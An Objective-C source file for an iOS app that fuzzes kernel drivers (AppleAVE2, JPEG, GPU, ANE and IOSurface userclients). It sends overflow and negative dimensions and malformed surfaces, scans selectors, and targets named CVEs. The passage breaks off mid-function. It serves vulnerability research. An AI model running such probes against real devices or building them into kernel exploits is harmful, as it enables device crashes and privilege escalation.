#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <mach/mach_port.h>
#import <mach/vm_map.h>
#import <sys/utsname.h>
#import <unistd.h>
#import <stdarg.h>
#import <stdint.h>
#import <string.h>
#import <stdlib.h>

// ---------------------------------------------------------------------------
// CandProbe — 18.7.2 / A12 kernel candidate surface probe
//
// The app is deliberately split into independent buttons:
//   1. Enumerate IOKit services / open types (safe)
//   2. VTCompressionSession overflow / negative-dimension tests (AVE)
//   3. Raw AppleAVE2Driver selector-1 open-struct presets
//   4. AppleAVE2 selector scan using the real input sizes
//   5. Generic selector scan on media/GPU/HID userclients
//   6. Mach VM edge cases (CVE-2026-43724 / 28972 candidates)
//
// Every risky call writes a breadcrumb to Documents/candprobe-state.txt and
// fsyncs it. If the device panics, the next launch shows the exact call.
// ---------------------------------------------------------------------------

#define AVE_OPEN_IN_SIZE   0x6e0
#define AVE_OPEN_OUT_SIZE  0x28
#define AVE_PREPARE_SIZE   0x2df70
#define AVE_START_IN_SIZE  0x2df70
#define AVE_START_OUT_SIZE 0x2d0

static UITextView *gLogView = nil;
static UILabel *gStatusLabel = nil;
static NSString *gLogPath = nil;
static NSFileHandle *gLogFile = nil;
static NSLock *gLogLock = nil;
static dispatch_queue_t gWorkQueue = nil;
static NSMutableString *gPendingLog = nil;

static NSString *docDir(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

static NSString *stamp(void) {
    NSDateFormatter *f = [[NSDateFormatter alloc] init];
    f.dateFormat = @"HH:mm:ss.SSS";
    return [f stringFromDate:[NSDate date]];
}

static void flushPending(void) {
    NSString *pending = nil;
    @synchronized (gPendingLog) {
        if (gPendingLog.length == 0) return;
        pending = [gPendingLog copy];
        [gPendingLog setString:@""];
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        if (!gLogView) return;
        gLogView.text = [gLogView.text stringByAppendingString:pending];
        NSRange r = NSMakeRange(gLogView.text.length, 0);
        [gLogView scrollRangeToVisible:r];
    });
}

static void logLine(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);

    NSString *line = [NSString stringWithFormat:@"[%@] %@\n", stamp(), msg];
    @synchronized (gPendingLog) {
        [gPendingLog appendString:line];
    }
    if (gLogFile) {
        @synchronized (gLogFile) {
            @try {
                [gLogFile writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
                [gLogFile synchronizeFile];
            } @catch (__unused NSException *e) {}
        }
    }
    if (gPendingLog.length > 2048) flushPending();
}

static void crumb(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);

    NSString *path = [docDir() stringByAppendingPathComponent:@"candprobe-state.txt"];
    NSString *line = [NSString stringWithFormat:@"[%@] %@\n", stamp(), msg];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) return;
    @try {
        [fh seekToEndOfFile];
        [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
        [fh synchronizeFile];
    } @catch (__unused NSException *e) {}
    [fh closeFile];
}

static NSString *lastCrumb(void) {
    NSString *path = [docDir() stringByAppendingPathComponent:@"candprobe-state.txt"];
    NSString *s = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    if (s.length == 0) return nil;
    NSArray *lines = [s componentsSeparatedByString:@"\n"];
    for (NSInteger i = (NSInteger)lines.count - 1; i >= 0; i--) {
        if ([lines[(NSUInteger)i] length] > 0) return lines[(NSUInteger)i];
    }
    return nil;
}

static void newLogFile(void) {
    NSDateFormatter *f = [[NSDateFormatter alloc] init];
    f.dateFormat = @"yyyyMMdd-HHmmss";
    NSString *name = [NSString stringWithFormat:@"candprobe-%@.log", [f stringFromDate:[NSDate date]]];
    gLogPath = [docDir() stringByAppendingPathComponent:name];
    [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
    gLogFile = [NSFileHandle fileHandleForWritingAtPath:gLogPath];
    if (!gLogFile) {
        gLogFile = [NSFileHandle fileHandleForWritingAtPath:gLogPath];
    }
}

static BOOL isInterestingClass(NSString *cls) {
    static NSArray<NSString *> *keys = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        keys = @[@"JPEG", @"AVE", @"AVD", @"ANE", @"H11", @"IOSurface",
                 @"Accelerator", @"AGX", @"GPU", @"M2Scaler", @"HID",
                 @"Multitouch", @"Actuator", @"Camera", @"ISP", @"Media",
                 @"Video", @"Encoder", @"Decoder", @"SPU", @"SEP",
                 @"AppleH", @"DART", @"MCTF", @"Scaler"];
    });
    for (NSString *k in keys) {
        if ([cls rangeOfString:k options:NSCaseInsensitiveSearch].location != NSNotFound) return YES;
    }
    return NO;
}

static BOOL isRiskyClass(NSString *cls) {
    static NSArray<NSString *> *keys = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        keys = @[@"Camera", @"ISP", @"SEP", @"SPU", @"DART", @"AppleH",
                 @"Baseband", @"PCIe", @"Display", @"Backlight"];
    });
    for (NSString *k in keys) {
        if ([cls rangeOfString:k options:NSCaseInsensitiveSearch].location != NSNotFound) return YES;
    }
    return NO;
}

static NSString *ioClassName(io_object_t obj) {
    io_name_t name = {0};
    if (IOObjectGetClass(obj, name) == KERN_SUCCESS) {
        return [NSString stringWithUTF8String:name];
    }
    return @"?";
}

static NSString *ioRegName(io_object_t obj) {
    io_name_t name = {0};
    if (IORegistryEntryGetName(obj, name) == KERN_SUCCESS) {
        return [NSString stringWithUTF8String:name];
    }
    return @"?";
}

// ---------------------------------------------------------------------------
// IOKit enumeration
// ---------------------------------------------------------------------------

static NSUInteger enumerateIOKit(BOOL tryOpen) {
    io_iterator_t iter = MACH_PORT_NULL;
    CFMutableDictionaryRef match = IOServiceMatching("IOService");
    kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        logLine(@"enumerate: IOServiceGetMatchingServices kr=0x%x", kr);
        return 0;
    }

    NSUInteger count = 0, interesting = 0, opened = 0;
    io_service_t svc;
    while ((svc = IOIteratorNext(iter)) != MACH_PORT_NULL) {
        count++;
        NSString *cls = ioClassName(svc);
        NSString *reg = ioRegName(svc);
        if (isInterestingClass(cls)) {
            interesting++;
            logLine(@"SVC %@  reg=%@", cls, reg);
            if (tryOpen) {
                uint32_t maxType = isRiskyClass(cls) ? 0 : 2;
                for (uint32_t type = 0; type <= maxType; type++) {
                    io_connect_t conn = MACH_PORT_NULL;
                    kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
                    if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
                        opened++;
                        logLine(@"  OPEN %@ type=%u -> conn=%u", cls, type, conn);
                        IOServiceClose(conn);
                    } else if (type == 0 && kr != kIOReturnUnsupported && kr != kIOReturnNotPermitted) {
                        logLine(@"  open %@ type=0 -> 0x%x", cls, kr);
                    }
                }
            }
        }
        IOObjectRelease(svc);
    }
    IOObjectRelease(iter);
    logLine(@"enumerate: total=%lu interesting=%lu opened=%lu", (unsigned long)count,
            (unsigned long)interesting, (unsigned long)opened);
    return count;
}

// ---------------------------------------------------------------------------
// AppleAVE2 raw probes
// ---------------------------------------------------------------------------

static io_connect_t openAVE(void) {
    io_service_t svc = MACH_PORT_NULL;
    io_iterator_t iter = MACH_PORT_NULL;
    CFMutableDictionaryRef match = IOServiceMatching("AppleAVE2Driver");
    kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter);
    if (kr == KERN_SUCCESS && iter != MACH_PORT_NULL) {
        svc = IOIteratorNext(iter);
        IOObjectRelease(iter);
    }
    if (svc == MACH_PORT_NULL) {
        // Fallback: enumerate all services and match the class name.
        match = IOServiceMatching("IOService");
        kr = IOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter);
        if (kr == KERN_SUCCESS && iter != MACH_PORT_NULL) {
            io_service_t s;
            while ((s = IOIteratorNext(iter)) != MACH_PORT_NULL) {
                NSString *cls = ioClassName(s);
                if ([cls rangeOfString:@"AVE" options:NSCaseInsensitiveSearch].location != NSNotFound) {
                    svc = s;
                    logLine(@"AVE: fallback match class=%@", cls);
                    break;
                }
                IOObjectRelease(s);
            }
            IOObjectRelease(iter);
        }
    }
    if (svc == MACH_PORT_NULL) {
        logLine(@"AVE: no AppleAVE2 service found");
        return MACH_PORT_NULL;
    }
    io_connect_t conn = MACH_PORT_NULL;
    for (uint32_t type = 0; type <= 7; type++) {
        kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
        logLine(@"AVE: open type=%u kr=0x%x conn=%u", type, kr, conn);
        if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) break;
    }
    IOObjectRelease(svc);
    return conn;
}

static void aveOpenPreset(io_connect_t conn, NSString *name, int32_t width, int32_t height,
                          int variant) {
    uint8_t *in = calloc(1, AVE_OPEN_IN_SIZE);
    uint8_t *out = calloc(1, AVE_OPEN_OUT_SIZE);
    if (!in || !out) {
        free(in); free(out);
        return;
    }

    // Known version string at +0x28 (15 bytes, compared by AVE_UCCmd_CheckParam_Open).
    memcpy(in + 0x28, "803.73.1", 9);

    // Plausible buffer-descriptor words at +0x00..+0x18 for variants 1/2.
    if (variant == 1) {
        *(uint64_t *)(in + 0x00) = 0x1000;
        *(uint64_t *)(in + 0x08) = 0x1000;
        *(uint64_t *)(in + 0x10) = 0;
    } else if (variant == 2) {
        *(uint64_t *)(in + 0x00) = 0x4000;
        *(uint64_t *)(in + 0x08) = 0x4000;
        *(uint64_t *)(in + 0x10) = 0x1000;
        in[0x38] = 1;
    }

    // Width/height observed in AVE_Client_CheckCommonInfo: pInfo + 0x698 / +0x69c.
    *(int32_t *)(in + 0x698) = width;
    *(int32_t *)(in + 0x69c) = height;

    size_t outSize = AVE_OPEN_OUT_SIZE;
    crumb(@"START AVE open %@ variant=%d %dx%d", name, variant, width, height);
    kern_return_t kr = IOConnectCallStructMethod(conn, 1, in, AVE_OPEN_IN_SIZE, out, &outSize);
    crumb(@"DONE AVE open %@ variant=%d kr=0x%x outSize=0x%zx", name, variant, kr, outSize);
    logLine(@"AVE open[%@/v%d] %dx%d -> kr=0x%x outSize=0x%zx out64=%016llx",
            name, variant, width, height, kr, outSize,
            (unsigned long long)*(uint64_t *)out);
    free(in);
    free(out);
}

static void runAVEProbes(void) {
    logLine(@"=== AVE raw probes ===");
    io_connect_t conn = openAVE();
    if (conn == MACH_PORT_NULL) {
        logLine(@"AVE: userclient not available");
        return;
    }

    struct { const char *name; int32_t w, h; } cases[] = {
        {"control-1080p", 1920, 1080},
        {"neg-1x-1", -1, -1},
        {"neg-1x1080", -1, 1080},
        {"neg-1080x-1", 1080, -1},
        {"int32min-x2", INT32_MIN, 2},
        {"max-x2", INT32_MAX, 2},
        {"area-46341", 46341, 46341},
        {"area-65535", 65535, 65535},
        {"wide-1Gx2", 0x40000000, 2},
    };

    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
        aveOpenPreset(conn, [NSString stringWithUTF8String:cases[i].name], cases[i].w, cases[i].h, 0);
        usleep(150 * 1000);
    }
    aveOpenPreset(conn, @"pos-1080p-v1", 1920, 1080, 1);
    aveOpenPreset(conn, @"neg-v1", -1, -1, 1);
    aveOpenPreset(conn, @"neg-v2", -1, -1, 2);
    IOServiceClose(conn);
    logLine(@"=== AVE raw probes done ===");
}

static void runAVESelectorScan(void) {
    logLine(@"=== AVE selector scan (declared sizes) ===");
    io_connect_t conn = openAVE();
    if (conn == MACH_PORT_NULL) return;

    struct { uint32_t sel; size_t in; size_t out; const char *name; } sels[] = {
        {1, AVE_OPEN_IN_SIZE, AVE_OPEN_OUT_SIZE, "Open"},
        {2, 0x28, 0x20, "Close"},
        {3, 0x38, 0x20, "Config"},
        {4, AVE_PREPARE_SIZE, 0x20, "Prepare"},
        {5, AVE_START_IN_SIZE, AVE_START_OUT_SIZE, "Start"},
        {6, 0x30, 0x20, "Stop"},
        {7, 0x30, 0x20, "Process"},
        {8, 0x30, 0x20, "Complete"},
        {9, 0x30, 0x20, "Flush"},
        {10, 0x30, 0x20, "Reset"},
        {11, 0, 0, "?"},
    };

    for (size_t i = 0; i < sizeof(sels) / sizeof(sels[0]); i++) {
        void *in = sels[i].in ? calloc(1, sels[i].in) : NULL;
        void *out = sels[i].out ? calloc(1, sels[i].out) : NULL;
        size_t outSize = sels[i].out;
        crumb(@"START AVE sel=%u %s in=0x%zx", sels[i].sel, sels[i].name, sels[i].in);
        kern_return_t kr = IOConnectCallStructMethod(conn, sels[i].sel, in, sels[i].in, out, &outSize);
        crumb(@"DONE AVE sel=%u kr=0x%x out=0x%zx", sels[i].sel, kr, outSize);
        logLine(@"AVE sel %2u %-8s in=0x%05zx out=0x%05zx -> kr=0x%x outSize=0x%zx",
                sels[i].sel, sels[i].name, sels[i].in, sels[i].out, kr, outSize);
        free(in);
        free(out);
        usleep(50 * 1000);
    }
    IOServiceClose(conn);
    logLine(@"=== AVE selector scan done ===");
}

// ---------------------------------------------------------------------------
// VideoToolbox AVE tests
// ---------------------------------------------------------------------------

static void vtOutputCallback(void *refCon, void *sourceFrameRefCon, OSStatus status,
                             VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    logLine(@"VT callback status=%d flags=0x%x sample=%p", (int)status, (unsigned)infoFlags, sampleBuffer);
}

static NSString *gAVEEncoderID = nil;

static void logSupported(NSString *label, int32_t w, int32_t h, CMVideoCodecType codec,
                         BOOL useAVE) {
    NSDictionary *spec = nil;
    if (useAVE && gAVEEncoderID.length) {
        spec = @{(__bridge NSString *)kVTVideoEncoderSpecification_EncoderID: gAVEEncoderID};
    }
    CFStringRef supID = NULL;
    CFDictionaryRef supProps = NULL;
    crumb(@"START supported %@ %dx%d ave=%d", label, w, h, useAVE ? 1 : 0);
    OSStatus st = VTCopySupportedPropertyDictionaryForEncoder(
        w, h, codec, (__bridge CFDictionaryRef)spec, &supID, &supProps);
    crumb(@"DONE supported %@ %dx%d st=%d", label, w, h, (int)st);
    logLine(@"SUP %@ %dx%d codec=%u forceAVE=%d -> st=%d id=%@ props=%d",
            label, w, h, (unsigned)codec, useAVE ? 1 : 0, (int)st,
            supID ?: (__bridge CFStringRef)@"(nil)", supProps != NULL);
    if (supID) CFRelease(supID);
    if (supProps) CFRelease(supProps);
}

static void runVTOne(NSString *label, int32_t w, int32_t h, CMVideoCodecType codec, OSType pf,
                     BOOL useAVE) {
    logLine(@"VT %@ codec=%u %dx%d pf=0x%x forceAVE=%d", label, (unsigned)codec, w, h,
            (unsigned)pf, useAVE ? 1 : 0);
    logSupported(label, w, h, codec, useAVE);
    NSDictionary *attrs = @{
        (__bridge NSString *)kCVPixelBufferPixelFormatTypeKey: @(pf),
        (__bridge NSString *)kCVPixelBufferWidthKey: @(w),
        (__bridge NSString *)kCVPixelBufferHeightKey: @(h),
        (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
    };
    NSDictionary *spec = nil;
    if (useAVE && gAVEEncoderID.length) {
        spec = @{(__bridge NSString *)kVTVideoEncoderSpecification_EncoderID: gAVEEncoderID};
    }

    VTCompressionSessionRef session = NULL;
    crumb(@"START VT create %@ codec=%u %dx%d ave=%d", label, (unsigned)codec, w, h, useAVE ? 1 : 0);
    OSStatus st = VTCompressionSessionCreate(NULL, w, h, codec,
                                             (__bridge CFDictionaryRef)spec,
                                             (__bridge CFDictionaryRef)attrs, NULL,
                                             vtOutputCallback, NULL, &session);
    crumb(@"DONE VT create %@ st=%d session=%p", label, (int)st, session);
    logLine(@"VT create -> %d session=%p", (int)st, session);
    if (st != noErr || session == NULL) return;

    CFTypeRef encoderID = NULL;
    if (VTSessionCopyProperty(session, kVTCompressionPropertyKey_EncoderID, NULL, &encoderID) == noErr && encoderID) {
        logLine(@"VT encoderID=%@", encoderID);
        CFRelease(encoderID);
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    crumb(@"START VT prepare %@", label);
    st = VTCompressionSessionPrepareToEncodeFrames(session);
    crumb(@"DONE VT prepare %@ st=%d", label, (int)st);
    logLine(@"VT prepare -> %d", (int)st);

    if (st == noErr) {
        int32_t fw = 64, fh = 64;
        if (w > 0 && h > 0 && (int64_t)w * (int64_t)h <= 2048LL * 2048LL) {
            fw = w;
            fh = h;
        }
        CVPixelBufferRef pb = NULL;
        NSDictionary *pbAttrs = @{(__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}};
        CVReturn cv = CVPixelBufferCreate(NULL, fw, fh, pf, (__bridge CFDictionaryRef)pbAttrs, &pb);
        logLine(@"VT pixelbuffer %dx%d -> %d %p", fw, fh, (int)cv, pb);
        if (cv == kCVReturnSuccess && pb) {
            VTEncodeInfoFlags flags = 0;
            crumb(@"START VT encode %@", label);
            st = VTCompressionSessionEncodeFrame(session, pb, kCMTimeZero, CMTimeMake(1, 30),
                                                 NULL, NULL, &flags);
            crumb(@"DONE VT encode %@ st=%d", label, (int)st);
            logLine(@"VT encode -> %d flags=0x%x", (int)st, (unsigned)flags);
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            CFRelease(pb);
        }
    }
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void runVTTests(void) {
    logLine(@"=== VT / AppleAVE2 tests ===");
    struct { const char *name; int32_t w, h; } cases[] = {
        {"control-1080p", 1920, 1080},
        {"neg-1x-1", -1, -1},
        {"neg-1x1080", -1, 1080},
        {"neg-1080x-1", 1080, -1},
        {"int32min-x2", INT32_MIN, 2},
        {"area-4096", 4096, 4096},
        {"area-8192", 8192, 8192},
        {"area-16384", 16384, 16384},
        {"area-32768", 32768, 32768},
        {"area-46341", 46341, 46341},
        {"area-65535", 65535, 65535},
        {"wide-1Gx2", 0x40000000, 2},
    };

    CFArrayRef encList = NULL;
    if (VTCopyVideoEncoderList(NULL, &encList) == noErr && encList) {
        for (NSDictionary *d in (__bridge NSArray *)encList) {
            NSString *eid = d[(__bridge NSString *)kVTVideoEncoderList_EncoderID];
            NSString *name = d[(__bridge NSString *)kVTVideoEncoderList_EncoderName];
            NSNumber *hw = d[(__bridge NSString *)kVTVideoEncoderList_IsHardwareAccelerated];
            NSNumber *codec = d[(__bridge NSString *)kVTVideoEncoderList_CodecType];
            logLine(@"ENC id=%@ name=%@ hw=%@ codec=0x%x", eid, name, hw,
                    codec.unsignedIntValue);
            if (codec.unsignedIntValue == kCMVideoCodecType_H264 &&
                hw.boolValue &&
                ![eid.lowercaseString containsString:@"rtvc"]) {
                gAVEEncoderID = eid;
            }
        }
        CFRelease(encList);
    }
    logLine(@"AVE encoder ID = %@", gAVEEncoderID ?: @"(not found)");

    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
        runVTOne([NSString stringWithUTF8String:cases[i].name], cases[i].w, cases[i].h,
                 kCMVideoCodecType_H264, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NO);
        usleep(300 * 1000);
    }
    runVTOne(@"h264-bgra-control", 1920, 1080, kCMVideoCodecType_H264,
             kCVPixelFormatType_32BGRA, NO);
    runVTOne(@"h264-bgra-neg", -1, -1, kCMVideoCodecType_H264,
             kCVPixelFormatType_32BGRA, NO);
    runVTOne(@"hevc-control", 1920, 1080, kCMVideoCodecType_HEVC,
             kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NO);
    runVTOne(@"hevc-neg", -1, -1, kCMVideoCodecType_HEVC,
             kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NO);

    if (gAVEEncoderID.length) {
        // Force the AVE encoder. If create fails here, the huge sizes never
        // reached AppleAVE2 even though the default session succeeded.
        runVTOne(@"ave-control", 1920, 1080, kCMVideoCodecType_H264,
                 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, YES);
        runVTOne(@"ave-area-46341", 46341, 46341, kCMVideoCodecType_H264,
                 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, YES);
        runVTOne(@"ave-area-65535", 65535, 65535, kCMVideoCodecType_H264,
                 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, YES);
        runVTOne(@"ave-wide-1Gx2", 0x40000000, 2, kCMVideoCodecType_H264,
                 kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, YES);
    } else {
        logLine(@"AVE encoder not in list; forced pass skipped");
    }
    logLine(@"=== VT tests done ===");
}

// ---------------------------------------------------------------------------
// VT malformed IOSurface frame
//
// The hardware H264 encoder rejects 46341x46341 at VTCompressionSessionCreate.
// This test keeps the session small (so the AVE encoder is selected) and feeds
// it a CVPixelBuffer backed by an IOSurface whose reported dimensions are huge
// but whose allocation is tiny. If AVE uses the frame/surface dimensions for
// its buffer-size math, this is the path that reaches AVE_CalcBufSizeOf*.
// ---------------------------------------------------------------------------

static CVPixelBufferRef createPixelBufferFromSurface(IOSurfaceRef surf) {
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
    logLine(@"  CVPixelBufferCreateWithIOSurface -> %d %p", (int)cv, pb);
    return pb;
}

static void runVTMalformedSurface(void) {
    logLine(@"=== VT malformed IOSurface frame ===");
    NSDictionary *spec = nil;
    if (gAVEEncoderID.length) {
        spec = @{(__bridge NSString *)kVTVideoEncoderSpecification_EncoderID: gAVEEncoderID};
    }
    NSDictionary *attrs = @{
        (__bridge NSString *)kCVPixelBufferPixelFormatTypeKey:
            @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
        (__bridge NSString *)kCVPixelBufferWidthKey: @(1920),
        (__bridge NSString *)kCVPixelBufferHeightKey: @(1080),
        (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
    };
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264,
                                             (__bridge CFDictionaryRef)spec,
                                             (__bridge CFDictionaryRef)attrs, NULL,
                                             vtOutputCallback, NULL, &session);
    logLine(@"malformed: VT create 1920x1080 forceAVE=%d -> %d session=%p",
            spec != nil, (int)st, session);
    if (st != noErr || session == NULL) return;
    VTCompressionSessionPrepareToEncodeFrames(session);

    struct { int32_t w, h; uint32_t bpe; size_t alloc; } cases[] = {
        {1920, 1080, 1, 0},          // control: normal allocation
        {46341, 46341, 1, 0x4000},   // overflow area, tiny allocation
        {65535, 65535, 1, 0x4000},
        {-1, -1, 1, 0x4000},
        {8192, 8192, 1, 0x4000},
        {16384, 16384, 1, 0x4000},
    };

    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
        NSMutableDictionary *props = [@{
            (__bridge NSString *)kIOSurfaceWidth: @(cases[i].w),
            (__bridge NSString *)kIOSurfaceHeight: @(cases[i].h),
            (__bridge NSString *)kIOSurfaceBytesPerElement: @(cases[i].bpe),
            (__bridge NSString *)kIOSurfacePixelFormat:
                @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
        } mutableCopy];
        if (cases[i].alloc) {
            props[(__bridge NSString *)kIOSurfaceAllocSize] = @(cases[i].alloc);
        }
        crumb(@"START IOSurface %dx%d bpe=%u alloc=0x%zx", cases[i].w, cases[i].h,
              cases[i].bpe, cases[i].alloc);
        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        crumb(@"DONE IOSurface %dx%d surf=%p", cases[i].w, cases[i].h, surf);
        logLine(@"IOSURF request %dx%d bpe=%u alloc=0x%zx -> %p",
                cases[i].w, cases[i].h, cases[i].bpe, cases[i].alloc, surf);
        if (!surf) continue;

        logLine(@"  actual w=%zu h=%zu bpr=%zu alloc=0x%zx",
                IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf),
                IOSurfaceGetBytesPerRow(surf), IOSurfaceGetAllocSize(surf));
        CVPixelBufferRef pb = createPixelBufferFromSurface(surf);
        if (pb) {
            VTEncodeInfoFlags flags = 0;
            crumb(@"START malformed encode %dx%d", cases[i].w, cases[i].h);
            OSStatus est = VTCompressionSessionEncodeFrame(session, pb, kCMTimeZero,
                                                           CMTimeMake(1, 30), NULL, NULL, &flags);
            crumb(@"DONE malformed encode %dx%d st=%d", cases[i].w, cases[i].h, (int)est);
            logLine(@"  encode -> %d flags=0x%x", (int)est, (unsigned)flags);
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            CFRelease(pb);
        }
        CFRelease(surf);
        usleep(200 * 1000);
    }
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    logLine(@"=== malformed IOSurface frame done ===");
}

// ---------------------------------------------------------------------------
// Generic selector scan
// ---------------------------------------------------------------------------

static void probeConnect(NSString *cls, uint32_t type, io_connect_t conn) {
    logLine(@"PROBE %@ type=%u", cls, type);

    // Scalar calls, selectors 0..15.
    for (uint32_t sel = 0; sel <= 15; sel++) {
        uint64_t out[8] = {0};
        uint32_t outCnt = 8;
        crumb(@"START scalar %@ t=%u sel=%u", cls, type, sel);
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outCnt);
        crumb(@"DONE scalar %@ t=%u sel=%u kr=0x%x", cls, type, sel, kr);
        if (kr == KERN_SUCCESS) {
            logLine(@"  %@ t=%u sel=%u scalar -> kr=0 outCnt=%u v0=%016llx",
                    cls, type, sel, outCnt, (unsigned long long)out[0]);
        }
    }

    // Struct calls with several sizes. Keep the number of calls bounded.
    static const size_t sizes[] = {0x10, 0x30, 0x58, 0x100, 0x1000};
    for (uint32_t sel = 0; sel <= 15; sel++) {
        for (size_t si = 0; si < sizeof(sizes) / sizeof(sizes[0]); si++) {
            size_t inSize = sizes[si];
            uint8_t *in = calloc(1, inSize);
            uint8_t *out = calloc(1, 0x1000);
            size_t outSize = 0x1000;
            if (!in || !out) { free(in); free(out); continue; }
            crumb(@"START struct %@ t=%u sel=%u in=0x%zx", cls, type, sel, inSize);
            kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, inSize, out, &outSize);
            crumb(@"DONE struct %@ t=%u sel=%u kr=0x%x out=0x%zx", cls, type, sel, kr, outSize);
            if (kr == KERN_SUCCESS ||
                (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported &&
                 kr != kIOReturnNotPermitted && kr != kIOReturnError)) {
                logLine(@"  %@ t=%u sel=%u in=0x%zx -> kr=0x%x outSize=0x%zx",
                        cls, type, sel, inSize, kr, outSize);
            }
            free(in);
            free(out);
        }
    }
}

static void runGenericSelectorScan(void) {
    logLine(@"=== generic selector scan ===");
    io_iterator_t iter = MACH_PORT_NULL;
    CFMutableDictionaryRef match = IOServiceMatching("IOService");
    kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        logLine(@"scan: iterator kr=0x%x", kr);
        return;
    }

    io_service_t svc;
    NSUInteger seen = 0;
    while ((svc = IOIteratorNext(iter)) != MACH_PORT_NULL) {
        NSString *cls = ioClassName(svc);
        if (!isInterestingClass(cls)) {
            IOObjectRelease(svc);
            continue;
        }
        seen++;
        io_connect_t conn = MACH_PORT_NULL;
        kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            logLine(@"SCAN %@ open type=0", cls);
            probeConnect(cls, 0, conn);
            IOServiceClose(conn);
        } else {
            logLine(@"SCAN %@ open type=0 -> 0x%x", cls, kr);
        }
        IOObjectRelease(svc);
        if (seen > 24) break; // keep a single run bounded
    }
    IOObjectRelease(iter);
    logLine(@"=== generic selector scan done (%lu services) ===", (unsigned long)seen);
}

// ---------------------------------------------------------------------------
// Targeted media / GPU / ANE scan
// ---------------------------------------------------------------------------

static void runTargetedScan(void) {
    logLine(@"=== targeted media/GPU/ANE scan ===");
    struct { const char *cls; uint32_t type; const char *why; } targets[] = {
        {"AppleM2ScalerCSCDriver", 0, "IOSurfaceAccelerator CVE-2026-64760"},
        {"AppleM2ScalerCSCDriver", 1, "IOSurfaceAccelerator type 1"},
        {"AppleM2ScalerCSCDriver", 2, "IOSurfaceAccelerator type 2"},
        {"H11ANEIn", 1, "ANE / newjail surface"},
        {"AGXAcceleratorG11P_B0", 1, "IOGPUFamily"},
        {"AppleJPEGDriver", 0, "CVE-2026-20687"},
        {"AppleJPEGDriver", 1, "CVE-2026-20687 type 1"},
        {"AppleJPEGDriver", 2, "CVE-2026-20687 type 2"},
        {"IOSurfaceRoot", 0, "IOSurface KVA / leak surface"},
        {"AppleAVD", 0, "AppleAVD 865 -> 867"},
    };

    for (size_t t = 0; t < sizeof(targets) / sizeof(targets[0]); t++) {
        NSString *want = [NSString stringWithUTF8String:targets[t].cls];
        io_iterator_t iter = MACH_PORT_NULL;
        CFMutableDictionaryRef match = IOServiceMatching("IOService");
        kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter);
        if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
            logLine(@"targeted: iterator kr=0x%x", kr);
            return;
        }
        io_service_t found = MACH_PORT_NULL;
        io_service_t svc;
        while ((svc = IOIteratorNext(iter)) != MACH_PORT_NULL) {
